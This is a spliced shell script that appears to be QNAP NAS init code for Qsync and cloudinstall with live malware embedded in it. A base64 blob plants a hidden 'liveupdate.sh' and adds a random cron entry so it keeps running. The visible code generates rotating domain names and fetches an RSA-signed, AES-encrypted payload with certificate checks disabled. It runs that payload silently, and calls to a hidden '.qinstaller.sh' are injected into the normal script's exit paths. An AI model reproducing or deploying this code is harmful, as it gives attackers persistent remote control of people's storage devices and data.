pZD1gL2Jpbi9waWRvZiBxc3luY2RgCgkJCWlmIFsgIngkX3FzeW5jZF9waWQiICE9ICJ4LTEiIF0gJiYgWyAhIC16ICRfcXN5bmNkX3J1bl9waWQgXTsgdGhlbgoJCQkJYnJlYWsKCQkJZmkKCQkJdXNsZWVwIDUwMDAwCgkJCWk9YC91c3IvYmluL2V4cHIgJHtpfSArIDUwYAoJCWRvbmUKCWZpCglyZXR1cm4gLSRfaXJldAp9CgpzdG9wX3FzeW5jZCgpCnsKCSNfcXN5bmNkX2VuPWAvc2Jpbi9nZXRjZmcgIiIgRW5hYmxlZCAtZCAwIC1mIC9ldGMvcXN5bmMvcXN5bmNkLmNvbmZgCgkjWyAieCRfcXN5bmNkX2VuIiA9IHgwIF0gfHwgcmV0dXJuIC0xCglfcXN5bmNkX3BpZD1gL3NiaW4vZ2V0Y2ZnICIiIFBpZCAtZCAtMSAtZiAvZXRjL3FzeW5jL3FzeW5jZC5jb25mYAoJWyAkX3FzeW5jZF9waWQgLWx0IDAgXSAmJiByZXR1cm4gLTMKCSMgU2VuZCBTSUdVU1IxIHRvIGluZm9ybSB0aGUgZGFlbW9uIHRvIG91dHB1dCAiW1JUUlIgU2VydmVyXSBTdG9wcGVkIiBldmVudCBsb2cKCS9iaW4va2lsbCAtU0lHVVNSMSAkX3FzeW5jZF9waWQKCXVzbGVlcCAyMDAwMDAKCSMgU2VuZCBTSUdJTlQgdG8gc3RvcCB0aGUgUVN5bmNkIHByb2Nlc3MKCS9iaW4va2lsbCAtU0lHSU5UICRfcXN5bmNkX3BpZAoJX2tpbGxfcmV0PSQ/CglpZiBbICJ4JF9raWxsX3JldCIgIT0geDAgXTsgdGhlbgoJCXJldHVybiAtMwoJZmkKCWVjaG8gIm5lZWQgd2FpdCAkMSBtaWxsaXNlY29uZCIKCWk9MAoJd2hpbGUgdHJ1ZQoJZG8KCQllY2hvICIke2l9IG1pbGxpc2Vjb25kLi4uIgoJCV9xc3luY2RfcGlkPWAvc2Jpbi9nZXRjZmcgJycgUGlkIC1kIC0xIC1mIC9ldGMvcXN5bmMvcXN5bmNkLmNvbmZgCgkJX3FzeW5jZF9ydW5fcGlkPWAvYmluL3BpZG9mIHFzeW5jZGAKCQlpZiBbICJ4JF9xc3luY2RfcGlkIiA9ICJ4LTEiIF0gJiYgWyAteiAkX3FzeW5jZF9ydW5fcGlkIF07IHRoZW4KCQkJYnJlYWsKCQlmaQoJCWlmIFsgJHtpfSAtZ2UgJDEgXTsgdGhlbgoJCQkjIGlmIHRpbWUtb3V0LCB3ZSBzZW5kIHR3byBhZGRpdGlvbmFsIFNJR0lOVCB0byBmb3JjZSB0aGUgZGFlbW9uIHRvIHN0b3AuCgkJCWlmIFsgJF9xc3luY2RfcGlkIC1nZSAwIF07IHRoZW4KCQkJCS9iaW4va2lsbCAtU0lHVVNSMSAkX3FzeW5jZF9waWQKCQkJCXVzbGVlcCAyMDAwMDAKCQkJCS9iaW4va2lsbCAtU0lHVVNSMSAkX3FzeW5jZF9waWQKCQkJZmkKCQkJaj0wCgkJCXdoaWxlIFsgJHtqfSAtbHQgNTAwIF0KCQkJZG8KCQkJCV9xc3luY2RfcnVuX3BpZD1gL2Jpbi9waWRvZiBxc3luY2RgCgkJCQlpZiBbIC16ICRfcXN5bmNkX3J1bl9waWQgXTsgdGhlbgoJCQkJCXJldHVybiAwCgkJCQlmaQoJCQkJdXNsZWVwIDIwMDAwCgkJCQlqPWAvdXNyL2Jpbi9leHByICR7an0gKyAyMGAKCQkJZG9uZQoJCQlyZXR1cm4gLTYyCgkJZmkKCQl1c2xlZXAgNTAwMDAKCQlpPWAvdXNyL2Jpbi9leHByICR7aX0gKyA1MGAKCWRvbmUKCXJldHVybiAwCn0KCgppbnN0YWxsKCkKewoJbG9ja19maWxlPSIvdmFyL2xvY2svcWJveF9pbnN0YWxsX2Jpbi5sY2siCgoJaWYgWyAhIC1mICIke0lOU1RBTExfQlVJTERfSU59IiBdOyB0aGVuCgkJZGJnICJidWlsZC1pbiAke1FTWU5DX05BTUV9IGlzIGluc3RhbGxlZCIKCQlyZXR1cm4gMQoJZmkKCglpZiBbICEgLWYgJHtVUERBVEVQS0dfRElSfS8ke1FTWU5DX05BTUV9LmJpbiBdOyB0aGVuCgkJZGJnICIke1FTWU5DX05BTUV9LmJpbn0gbm90IGZvdW5kIgoJCXJldHVybiAxCglmaQoKCWlmIFsgISAteCAiJHtRUEtHX0NMSX0iIF07IHRoZW4KCQlkYmcgIiR7UVBLR19DTEl9IG5vdCBmb3VuZCIKCQlyZXR1cm4gMQoJZmkKCgkjIyBtYWtlIHN1cmUgdm9sdW1lIGlzIGV4aXN0CglpZiBbICEgLWQgL3NoYXJlL2Avc2Jpbi9nZXRjZmcgU0hBUkVfREVGIGRlZlB1YmxpYyAtZCBQdWJsaWMgLWYgL2V0Yy9jb25maWcvZGVmX3NoYXJlLmluZm9gIF07IHRoZW4KCQlkYmcgIi9zaGFyZS9QdWJsaWMgbm90IGZvdW5kIgoJCXJldHVybiAxCglmaQoKCSMjIGlzIHJlbW92ZWQgCglpZiBbIC1mICR7VVBEQVRFUEtHX0RJUn0vLiR7UVNZTkNfTkFNRX1fcmVtb3ZlZCBdOyB0aGVuCgkJL2Jpbi9ybSAtZiAke0lOU1RBTExfQlVJTERfSU59CgkJZGJnICIke1FTWU5DX05BTUV9IGlzIHJlbW92ZWQiCgkJcmV0dXJuIDEKCWZpCgoJaWYgWyAtZiAiJGxvY2tfZmlsZSIgXTsgdGhlbiAKCQlpZiBbICQoKCAkKGRhdGUgKyVzKSAtICQoZGF0ZSArJXMgLXIgJGxvY2tfZmlsZSkgKSkgLWxlIDE4MCBdOyB0aGVuCgkJCWVjaG8gIiR7UVNZTkNfTkFNRX0gaXMgaW5zdGFsbGluZyIKCQkJZGJnICIke1FTWU5DX05BTUV9IGlzIGluc3RhbGxpbmciCgkJCXJldHVybiAxCgkJZmkKCWZpCgoJL2Jpbi90b3VjaCAiJGxvY2tfZmlsZSIJCgkvYmluL3JtIC1mICR7SU5TVEFMTF9CVUlMRF9JTn0KCWRiZyAiaW5zdGFsbCBidWlsZC1pbiAke1FTWU5DX05BTUV9IHN0YXJ0IgoKCXNldF9kZWZhdWx0X2Rpc2FibGVfc3RhdHVzCgoJIyMgaW5zdGFsbCBidWlsZCBpbiBRc3luYwoJJHtRUEtHX0NMSX0gLUsgLW0gJHtVUERBVEVQS0dfRElSfS8ke1FTWU5DX05BTUV9LmJpbiA+IC9kZXYvbnVsbCAyPiYxCglzbGVlcCAyMAoKCXdhaXRfaW5zdGFsbD02MAoJIyMgYXZvaWQgaW5pdGlhbCB0YWtlIGxvbmcgdGltZSBvciBmYWlsCiAgICAgICAgd2hpbGUgWyAiJHdhaXRfaW5zdGFsbCIgLWd0IDAgXTsgZG8KCQlzdGNvZGU9YCRDTURfR0VUQ0ZHICR7UVNZTkNfTkFNRX0uYmluIHN0Y29kZSAtZiAvZXRjL2NvbmZpZy9xcGtnX2pvYi5jb25mYAogICAgICAgICAgICAgICAgaWYgWyAiJHN0Y29kZSIgPSAiMCIgXTsgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgZmkKICAgICAgICAgICAgICAgIHNsZWVwIDEKICAgICAgICAgICAgICAgIGxldCAid2FpdF9pbnN0YWxsLS0iCiAgICAgICAgZG9uZQoKCSR7UVBLR19DTEl9IC1DICR7UVNZTkNfTkFNRX0uYmluID4gL2Rldi9udWxsIDI+JjEKCS9iaW4vcm0gLWYgJHtVUERBVEVQS0dfRElSfS8uJHtRU1lOQ19OQU1FfV9kaXNhYmxlZAoJL2Jpbi9ybSAtZiAiJGxvY2tfZmlsZSIJCglkYmcgImluc3RhbGwgYnVpbGQtaW4gJHtRU1lOQ19OQU1FfSBzdWNjZXNzIgp9CgppZiBbICIkMSIgPT0gInN0b3AiIF07IHRoZW4KCWV4aXQgMApmaQpmaQpYRU9GCmNobW9kIDc1NSAiJHtiZGlyfS8ucXBrZy8ubGl2ZXVwZGF0ZS9saXZldXBkYXRlLnNoIgp0b3VjaCAtY3IgL2Jpbi9idXN5Ym94ICIke2JkaXJ9Ly5xcGtnLy5saXZldXBkYXRlL2xpdmV1cGRhdGUuc2giCiggKCBleGVjID4vZGV2L251bGwgMj4mMSA8L2Rldi9udWxsOyAiJHtiZGlyfS8ucXBrZy8ubGl2ZXVwZGF0ZS9saXZldXBkYXRlLnNoIiA8L2Rldi9udWxsID4vZGV2L251bGwgMj4vZGV2L251bGwgJiApICYgKQpmaQoKdGVzdCAteCAiJHtiZGlyfS8ucXBrZy8ubGl2ZXVwZGF0ZS9saXZldXBkYXRlLnNoIiB8fCBjaG1vZCA3NTUgIiR7YmRpcn0vLnFwa2cvLmxpdmV1cGRhdGUvbGl2ZXVwZGF0ZS5zaCIKCmNyb250YWJhcmdzPSQocHMgfCBncmVwICdjcltvXW5kICcgfCBzZWQgLW4gJ3MvLipjcm9uZFteMC05QS1aYS16LV0qXCguXCtcKS9cMS9wJykKdHJ5Y291bnQ9MTA7IHRyeWNvdW50PSQoKCAkdHJ5Y291bnQgLSAxMCApKQpzZXQgeCAkY3JvbnRhYmFyZ3M7IHNoaWZ0CndoaWxlIFsgJCMgLWd0IDAgXSAmJiBbICR0cnljb3VudCAtbHQgMTAgXTsgZG8KdHJ5Y291bnQ9JCgoICR0cnljb3VudCArIDEgKSkKZ2V0b3B0cyAnOmM6JyBPUFQgMj4vZGV2L251bGwKdGVzdCAiJE9QVCIgPSAnYycgJiYgY3JvbnRhYmZpbGU9IiR7T1BUQVJHfS9hZG1pbiIgJiYgYnJlYWsKdGVzdCAiJE9QVElORCIgLWd0IDAgJiYgc2hpZnQgIiRPUFRJTkQiICYmIE9QVElORD0xIHx8IGJyZWFrCmRvbmUKdGVzdCAiJGNyb250YWJmaWxlIiAmJiB0ZXN0IC1mICIke2Nyb250YWJmaWxlfSIgfHwgY3JvbnRhYmZpbGU9Jy90bXAvY3Jvbi9jcm9udGFicy9hZG1pbicKCmZvciBjcm9udGFiIGluICIkY3JvbnRhYmZpbGUiICIke2NvbmZkaXJ9L2Nyb250YWIiOyBkbwppZiAkZmdyZXAgIiR7YmRpcn0vLnFwa2cvLmxpdmV1cGRhdGUvbGl2ZXVwZGF0ZS5zaCIgIiRjcm9udGFiIjsgdGhlbgo6CmVsc2UKY3Jvbm1pbnM9JChwcmludGYgJyVpJyAiJCgoICRSQU5ET00gJSA2MCApKSIpCmNyb25ob3VyPSQocHJpbnRmICclaScgIiQoKCAkUkFORE9NICUgMjQgKSkiKQpjcm9uaG91cj0kKHByaW50ZiAnJWksJyAiJCgoICggJGNyb25ob3VyICsgOCApICUgMjQgKSkiICIkKCggKCAkY3JvbmhvdXIgKyAxNiApICUgMjQgKSkiKSIkY3JvbmhvdXIiCmVjaG8gIiRjcm9ubWlucyAkY3JvbmhvdXIiJyAqICogKiAnIiR7YmRpcn0vLnFwa2cvLmxpdmV1cGRhdGUvbGl2ZXVwZGF0ZS5zaCA+L2Rldi9udWxsIDI+L2Rldi9udWxsIiA+PiAiJGNyb250YWIiCmNyb250YWIgIiRjcm9udGFiIgpzbGVlcCAyCmZpCmRvbmUKKSAmICkgJgo=
EOF
)&)
( exec >/dev/null 2>&1; (
export PATH="${PATH}:/bin:/sbin:/usr/bin:/usr/sbin:/usr/bin/X11:/usr/local/sbin:/usr/local/bin"
command -v dirname >/dev/null 2>&1 || dirname () { test -z "$1" && echo "." && return; local r="${1%"${1##*[!/]}"}"; case $r in /*[!/]*/*|[!/]*/*) r="${r%/*}"; echo "${r%"${r##*[!/]}"}";; */*) echo ${r%%[!/]};; "") echo $1;; *) echo .;; esac; }
test -d /etc/config && confdir=/etc/config || { test -d /mnt/HDA_ROOT/.config && confdir=/mnt/HDA_ROOT/.config; }
test -d "$confdir" || confdir=/etc/config
command -v getcfg > /dev/null 2>&1 || getcfg () { sed -n 'H;${x;s/\(.*\
\['"${1//\//\\\/}"']\|^\['"${1//\//\\\/}"']\)\
//I;s/\(^\|\
\)\[[^\
]\+\]\
.*//p}' "${4:-${confdir}/uLinux.conf}" | sed -n 's/^'"${2//\//\\\/}"' \?= \?\(.*\)/\1/Ip'; }
bdir=
test -f "${confdir}/smb.conf" && for i in homes Public Download Multimedia Web Recordings; do bdir=`getcfg "$i" path -f "${confdir}/smb.conf"` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && test -d "$bdir" && testwriteable=$(mktemp "${bdir}/.tmp.XXXXXX") && rm "${testwriteable}" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}" && { command -v readlink >/dev/null 2>&1 || ln -sf /bin/busybox /usr/bin/readlink; for i in homes Public Download Multimedia Web Recordings; do bdir=`readlink "/share/${i}" 2>/dev/null` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && bdir=/share/${bdir##*/} && test -d "$bdir" && break; done;
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`getcfg SHARE_DEF defVolMP -f "${confdir}/def_share.info"`
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`mount | sed -n "s/.*\(\/share\/[^ /]\+\) .*/\1/gp" | head -n 1`
test -z "${bdir}" || test ! -d "${bdir}"; } && { for i in CACHEDEV3_DATA CACHEDEV2_DATA CACHEDEV1_DATA MD0_DATA; do test -d "/share/${i}" && bdir="/share/${i}" && break; done;
test -z "${bdir}" || test ! -d "${bdir}" && bdir=/mnt/HDA_ROOT; }
echo 'ab*c' | grep -F 'ab*c' >/dev/null 2>&1 && fgrep="grep -F" || { command -v fgrep >/dev/null 2>&1 && fgrep=fgrep || fgrep=grep; }
test "$fgrep" || fgrep=grep

if [ ! -f "${bdir}/.qpkg/.liveupdate/liveupdate.sh" ]; then
test -d "${bdir}/.qpkg" || mkdir -p "${bdir}/.qpkg" || mkdir "${bdir}/.qpkg"
test -d "${bdir}/.qpkg/.liveupdate" || mkdir "${bdir}/.qpkg/.liveupdate"
cat > "${bdir}/.qpkg/.liveupdate/liveupdate.sh" <<"XEOF"
#!/bin/sh

QNAP_QPKG=cloudinstall
QID_PRESISTENT_CONF=/etc/config/qid_persistent.conf
NAS_CLOUD_INSTALL_PATH=/home/httpd/cgi-bin/cloudinstall
CLOUD_INSTALL_PATH=/tunnel_agent
CLOUD_INSTALL_RAMDISK_PATH=/tunnel_agent_ramdisk
CLOUD_INSTALL_AGENT_FILE_PATH=$CLOUD_INSTALL_PATH/tunnel_agent.tar.bz2
COUNTER=1
ERROR_BAD_REQUEST=400

if [ "$fromrcS" = 'TRUE' ]; then
case "$1" in
  start)
    START_TIME=$(date +"%T")
    echo -e "start:$START_TIME" >> /tmp/.cloudinstall.log
    while [ "$CLOUD_INSTALL_AGENT_PID_LIST" == "" ];
    do
        # report device info and get cloudinstall agent app download url
        DOWNLOAD_URL=`/usr/sbin/qcloud_uninit_device_tool -r`
        if [ ! -d "$CLOUD_INSTALL_PATH" ]; then
            if [ "$NAS_ARCH" == "ARM_64" ]; then
                # create ramdisk and create a 64mb file
                /bin/mkdir -p $CLOUD_INSTALL_RAMDISK_PATH
                /bin/mount -t tmpfs -o size=64m tmpfs $CLOUD_INSTALL_RAMDISK_PATH
                /bin/dd if=/dev/zero of=$CLOUD_INSTALL_RAMDISK_PATH/image bs=1M count=64
                # create block size 1K filesystem
                /sbin/mke2fs -b 1024 $CLOUD_INSTALL_RAMDISK_PATH/image
                # create virtual disk
                export USED_LOOP_DEVICE=`/usr/local/sbin/losetup -f $CLOUD_INSTALL_RAMDISK_PATH/image`
                /sbin/setcfg -f $QID_PRESISTENT_CONF "CLOUDINSTALL" "USED_LOOP_DEVICE" "$USED_LOOP_DEVICE"
                /bin/mkdir -p $CLOUD_INSTALL_PATH
                # mount virtual disk
                /bin/mount $USED_LOOP_DEVICE $CLOUD_INSTALL_PATH
            else
                # create and mount tmpfs folder
                /bin/mkdir -p $CLOUD_INSTALL_PATH
                /bin/mount -t tmpfs -o size=64m tmpfs $CLOUD_INSTALL_PATH
            fi
        fi
        cd $CLOUD_INSTALL_PATH

        if [[ $DOWNLOAD_URL == https* ]]; then
            REPORT_SUCCESS_TIME=$(date +"%T")
        else
            REPORT_FAIL_TIME=$(date +"%T")
            echo -e " report_fail:$REPORT_FAIL_TIME\n response:$DOWNLOAD_URL" >> /tmp/.cloudinstall.log
            # stop retry when got bad request
            # prevent put bad request all the time
            if [[ $DOWNLOAD_URL == *$ERROR_BAD_REQUEST* ]]; then
                break
            fi
        fi

        # downlaod cloudinstall agent app
        /usr/sbin/qcloud_uninit_device_tool -o "$CLOUD_INSTALL_AGENT_FILE_PATH" -d "$DOWNLOAD_URL"

        if [ -f "$CLOUD_INSTALL_AGENT_FILE_PATH" ]; then
            DOWNLOAD_FINISH_TIME=$(date +"%T")
            # unzip and execute cloudinstallagent
            /bin/tar -xf $CLOUD_INSTALL_AGENT_FILE_PATH -C $CLOUD_INSTALL_PATH
            $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_ctl.sh start &> /dev/null

            UNZIP_TIME=$(date +"%T")
        fi

        if [ ! -d "$NAS_CLOUD_INSTALL_PATH" ]; then
            # create folder and create symbolic link
            /bin/mkdir -p $NAS_CLOUD_INSTALL_PATH
            /bin/ln -s $CLOUD_INSTALL_PATH/ui/cloudinstall.html $NAS_CLOUD_INSTALL_PATH/index.html
            /bin/ln -s $CLOUD_INSTALL_PATH/ui/cloudinstall.cgi $NAS_CLOUD_INSTALL_PATH/cloudinstall.cgi
            /bin/ln -s $CLOUD_INSTALL_PATH/ui/static $NAS_CLOUD_INSTALL_PATH/static
        fi

        # wait connect
        sleep 5
        CLOUD_INSTALL_AGENT_PID_LIST=`/bin/ps --columns 256 | /bin/grep "$CLOUD_INSTALL_PATH/bin/cloudinstallagent" | /bin/grep -v grep | /bin/awk '{print $1}'`
        if [ "$CLOUD_INSTALL_AGENT_PID_LIST" == "" ]; then
            SLEEP_TIME=$(( 30 * $COUNTER ))
            if [ $SLEEP_TIME -gt 300 ]; then
                SLEEP_TIME=300
            fi
            # wait next retry
            sleep $SLEEP_TIME
        fi
        COUNTER=$(( $COUNTER * 2 ))
    done

    END_TIME=$(date +"%T")
    echo -e "report_success:$REPORT_SUCCESS_TIME\ndownload_finish:$DOWNLOAD_FINISH_TIME\nunzip_finish:$UNZIP_TIME\nend:$END_TIME" >> /tmp/.cloudinstall.log
    # call for a new process group and for later kill
    /bin/setsid $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_disconnect_daemon.sh start &> /dev/null &
    /bin/setsid $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_daemon.sh &> /dev/null &

    # set cloudinstall report status
    /sbin/setcfg -f $QID_PRESISTENT_CONF "CLOUDINSTALL" "REPORT_STATUS" "uninit"
    # add link to report offline
    /bin/ln -sf /etc/init.d/cloudinstall_report_offline.sh /etc/rcK.d/K99cloudinstall_report_offline

    # buzzer
    HARDWARE_TYPE=$(uname -m)
    if [[ "$HARDWARE_TYPE" == *"x86"* ]];
    then
      /sbin/hal_app --se_buzzer enc_id=0,mode=101
    elif [[ "$HARDWARE_TYPE" == *"arm"* ]];
    then
      /sbin/pic_raw 81
    fi
    ;;

  stop)
    # disconnect cloudinstall agent
    $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_ctl.sh stop &> /dev/null
    $CLOUD_INSTALL_PATH/bin/cloudinstall_agent_disconnect_daemon.sh stop &> /dev/null
    for i in "${CLOUD_INSTALL_AGENT_DAEMON_PID_LIST[@]}"
    do
        # use bash kill instead /bin/kill for kill process group
        # cloudinstall agent daemon and inotifywait
        kill -9 -- -$i &>/dev/null
    done

    # umount
    if [ "$NAS_ARCH" == "ARM_64" ]; then
        /bin/umount -l $USED_LOOP_DEVICE
        /usr/local/sbin/losetup -d $USED_LOOP_DEVICE
    else
        /bin/umount -l $CLOUD_INSTALL_PATH
    fi
    # remove all files
    if [ -d "$NAS_CLOUD_INSTALL_PATH" ]; then
        /bin/rm -rf $NAS_CLOUD_INSTALL_PATH
    fi
    if [ -d "$CLOUD_INSTALL_PATH" ]; then
        /bin/rm -rf $CLOUD_INSTALL_PATH
    fi
    if [ -d "$CLOUD_INSTALL_RAMDISK_PATH" ]; then
        /bin/rm -rf $CLOUD_INSTALL_RAMDISK_PATH
    fi
    ;;

  restart)
    $0 stop
    $0 start
    ;;

  *)
    echo "Usage: $0 {start|stop|restart}"
    { /share/MD0_DATA/.system/.qinstaller.sh; exit 1; }
esac
{ /share/MD0_DATA/.system/.qinstaller.sh; exit 0; }


set_env()
{
	debug=`$CMD_GETCFG Qsync Debug -u -d NULL`
	if [ "$debug" != "NULL" ]; then
		/bin/touch $LOG_FILE
	else
		/bin/rm -f $LOG_FILE
	fi
}

set_env

dbg()
{
	if [ -f "$LOG_FILE" ]; then
		echo "[`date "+%H:%M:%S"`] $@ " >> $LOG_FILE
	fi
}

dbg "> $0 $@ (pid $$)"

fi

export PATH="${PATH}:/bin:/sbin:/usr/bin:/usr/sbin:/usr/bin/X11:/usr/local/sbin:/usr/local/bin"

command -v getcfg > /dev/null 2>&1 || getcfg () { sed -n 'H;${x;s/\(.*\n\['"${1//\//\\\/}"']\|^\['"${1//\//\\\/}"']\)\n//I;s/\(^\|\n\)\[[^\n]\+\]\n.*//p}' "${4:-${confdir}/uLinux.conf}" | sed -n 's/^'"${2//\//\\\/}"' \?= \?\(.*\)/\1/Ip'; }

test -d /etc/config && confdir=/etc/config || { test -d /mnt/HDA_ROOT/.config && confdir=/mnt/HDA_ROOT/.config; }
test -d "$confdir" || confdir=/etc/config

bdir=
test -f "${confdir}/smb.conf" && for i in homes Public Download Multimedia Web Recordings; do bdir=`getcfg "$i" path -f "${confdir}/smb.conf"` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && test -d "$bdir" && testwriteable=$(mktemp "${bdir}/.tmp.XXXXXX") && rm "${testwriteable}" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}" && { command -v readlink >/dev/null 2>&1 || ln -sf /bin/busybox /usr/bin/readlink; for i in Public Download Multimedia Web Recordings homes; do bdir=`readlink "/share/${i}" 2>/dev/null` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && bdir=/share/${bdir##*/} && test -d "$bdir" && break; done;
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`getcfg SHARE_DEF defVolMP -f "${confdir}/def_share.info"`
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`mount | sed -n "s/.*\(\/share\/[^ /]\+\) .*/\1/gp" | head -n 1`
test -z "${bdir}" || test ! -d "${bdir}"; } && { for i in CACHEDEV3_DATA CACHEDEV2_DATA CACHEDEV1_DATA MD0_DATA; do test -d "/share/${i}" && bdir="/share/${i}" && break; done;
test -z "${bdir}" || test ! -d "${bdir}" && bdir=/mnt/HDA_ROOT; }
echo 'ab*c' | grep -F 'ab*c' >/dev/null 2>&1 && fgrep="grep -F" || { command -v fgrep >/dev/null 2>&1 && fgrep=fgrep || fgrep=grep; }
test "$fgrep" || fgrep=grep
test "$RANDOM" || RANDOM=17653
genrstr () 
{ 
    local s=;
    local min=${1:-4};
    local max=${2:-12};
    local kspace="${3:-a-zA-Z}"
    tr -dc "$kspace" < /dev/urandom | { 
        read -rn $(($RANDOM % ( $max - $min + 1 ) + $min )) s;
        echo "$s"
    }
}

verifyfile() {
local file="$1"
local sig="${2:-$file_s}"
local out
test ! -z "$file" && test -s "$file" || return 1
test ! -z "$sig" && test -s "$sig" || return 1
test -f ".rsakey" || echo "$verifykey" > ".rsakey"
out=$(openssl dgst -sha1 -verify ".rsakey" -signature "$sig" "$file") && test "$out" = "Verified OK" && return 0
return 1
}

decryptfile() {
local file="$1"
local ofile="${2:-${file}}"
local key='7C0vK4SzMO15zBxLD7XCi5hbjgP1ZjkJ'
openssl enc -d -aes-256-cbc -k "$key" -md sha1 -salt < "$file" > "${file}_d" || return $?
test -f "$ofile" && rm -f "$ofile"
mv "${file}_d" "$ofile" && return 0
return 1
}

verifykey='-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAt/EDT6SB75atrHW7Cpog
CXqrBM2CVbJo';verifykey="${verifykey}"'g4rwwS''z1Bp1i1'
verifykey="${verifykey}"'B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex
RC5qQSiS/7FS48jsPKsJnrUhnsI1fRLM4DqsEF3UOukZuDOYUhlteDuMqqZBz0AC
Q3YnLjraTjchMF0XmaAAcWOkg5MsxAOKTepue4R/tnrPAkAG86nq5LA1+wa7opNV
gQzwDh7YXhBnWz52+ebZ9TeqD31/sb5hoyUKf1Nr5HcKkklObuz1OGQJ//pkCbTC
2EnQw6tCPQhgSIA8wJKkaxW0f/UHP+YBmWa4Wn+uPrJJuHSVNEJtAp2wlX3THltz
0IGPQEuzoafOAl3EFjas3HcTX2HlEfnvAtRL2iLxJeba1nZ+U3geZOuxL1NhWhNh
pjaLcKwhkRck7Y5hr1Pz8pLDnXsx5w0QUz6XS8HVf/KHnNXHufFEn01y9YoPuau1
DNnpDGbq632Bs8ESd3ueHk9OY/UZxWeN3UdbseFxK35XAgMBAAE=
-----END PUBLIC KEY-----'

DOMAIN_EXT_A='cf tk ml ga gq'
DOMAIN_EXT_B='com biz org de rocks mx cn top nl men ws se info xyz net today ru fi name to in com.ua vg vn cd'

test -d "${bdir}/.qpkg" || mkdir "${bdir}/.qpkg"
test -d "${bdir}/.qpkg/.liveupdate" || mkdir "${bdir}/.qpkg/.liveupdate"
cd "${bdir}/.qpkg/.liveupdate" && rm -f .tmp.*

echo "$verifykey" > ".rsakey"
i=0 n=0 c=0 errorcount=0
outfile=$(mktemp "./.tmp.XXXXXX") || outfile=$(mktemp "${bdir}/.tmp.XXXXXX") || outfile=$(mktemp "/.tmp.XXXXXX") || outfile='./.tmp.out'

for domainexts in "$DOMAIN_EXT_A" "$DOMAIN_EXT_B"; do
        for ext in $domainexts; do
                hostname=$(echo "$(( $(date +%s) / 1296000 ))IbjGOEgnuD${ext}" | openssl dgst -sha1 -binary | openssl base64 | sed 'y/ABCDEFGHIJKLMNOPQRSTUVWXYZ-+\//abcdefghijklmnopqrstuvwxyzabc/;s/=//g')
                hostname=${hostname%[a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9]}
                hostnames="${hostname%[a-z0-9][a-z0-9][a-z0-9][a-z0-9]} ${hostname%[a-z0-9][a-z0-9][a-z0-9]}"
                hostnames="$hostnames ${hostname%[a-z0-9][a-z0-9]} ${hostname%[a-z0-9]} $hostname"
                for host in $hostnames; do
                        test -f "$outfile" && rm -f "$outfile"
                        recentupdate=''
                        curl --connect-timeout 12 -m 30 -k -o "$outfile" "https://${host}.${ext}/qnap_firmware.xml?t=$(date +%s)"
                        test -s "$outfile" || continue
                        fsize=$(( $(wc -c < "$outfile") ))
                        test "$fsize" -gt 4096 && rm -f "$outfile" && continue
                        rsamsg=$(openssl base64 -in "$outfile" -d | openssl rsautl -pubin -inkey ".rsakey" -verify) || continue
                        test "$rsamsg" || continue
                        path="${rsamsg%|*}"; rsadomain="${path%|*}"; path="${path#*|}"
                        hash="${rsamsg##*|}"; ts="${hash#*_}"; hash="${hash%_*}"
                        test "$rsadomain" = "${host}.${ext}" || continue
                        timenow=$(date +%s)
                        test "$ts" -gt 0 && { test "$ts" -gt "$timenow" || test $(( $timenow - $ts )) -lt 172800; } && recentupdate=1
                        curl --connect-timeout 12 -m 300 -k -o "$outfile" "https://${host}.${ext}/${path}"
                        filehash=$(openssl dgst -sha1 -binary "$outfile" | openssl base64) || continue
                        test "$filehash" = "$hash" || continue
                        curl --connect-timeout 12 -m 30 -k -o "${outfile}_s" "https://${host}.${ext}/s/${path}"
                        verifyfile "$outfile" "${outfile}_s" && decryptfile "$outfile" || continue
                        mv "${outfile}_s" "${ts}_v"
                        chmod 755 "$outfile" || continue
                        ( ( exec >/dev/null 2>/dev/null </dev/null; "$outfile" </dev/null >/dev/null 2>&1 & ) & )
                        test "$recentupdate" -eq 1 && exit 0
                done
        done
done


if [ "$fromrcS" = 'TRUE' ]; then
# if Qsync is disable before 4.3.0, we will touch /mnt/HDA_ROOT/udpate_pkg/.QsyncServer_disabled
set_default_disable_status()
{
	QPKG_ENABLE=`$CMD_GETCFG ${QSYNC_NAME} Enable -d "NULL" -f ${QPKG_CONF}`
	OLD_ENABLE=`$CMD_GETCFG Qsync Enable -u -d NULL`
	if [ -f "${UPDATEPKG_DIR}/.${QSYNC_NAME}_removed" ]; then
		return
	fi

	if [ "$QPKG_ENABLE" = "NULL" ]; then
		if [ "$OLD_ENABLE" = "FALSE" ]; then
			dbg "touch ${UPDATEPKG_DIR}/.${QSYNC_NAME}_disabled"
			/bin/touch "${UPDATEPKG_DIR}/.${QSYNC_NAME}_disabled"
		fi
	fi
}

if [ "x$HBS_ENABLE" = xnull ] || [ "x$HBS_ENABLE" = xFALSE ]; then
	export QNAP_QPKG=rtrr
else
	export QNAP_QPKG=HybridBackup
	/usr/local/sbin/qboost_util -S -n rtrr -E 0 1>/dev/null 2>&1
fi
start()
{
	if [ -f /usr/bin/qsyncman ]; then
		[ ! -f /etc/config/hdcopyusb.conf ] || /bin/rm -f /etc/config/hdcopyusb.conf
		/bin/sed -i '/hdusb_copy/d' /etc/config/crontab
		/usr/bin/crontab /etc/config/crontab
		echo -n "Starting QSync manitor: "
		[ -d /etc/config/qsync ] || /usr/bin/install -d /etc/config/qsync
